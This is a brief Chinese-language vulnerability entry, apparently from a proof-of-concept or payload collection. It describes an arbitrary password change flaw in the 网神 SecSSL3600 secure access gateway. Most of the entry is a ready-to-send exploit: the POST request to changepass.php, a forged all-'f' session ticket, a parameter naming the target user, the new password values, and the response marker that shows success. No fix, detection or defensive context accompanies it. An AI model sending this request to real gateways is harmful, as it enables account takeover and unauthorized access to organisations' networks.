# 网神SecSSL3600安全接入网关系统任意密码修改漏洞

网神SecSSL3600安全接入网关系统任意密码修改 ｜ 其他 ｜ —
- **请求**：`POST /changepass.php?type=2  HTTP/1.1`

**Payload**
```
gw_user_ticket=ffffffffffffffffffffffffffffffff;
last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@
```
- **响应特征**：-1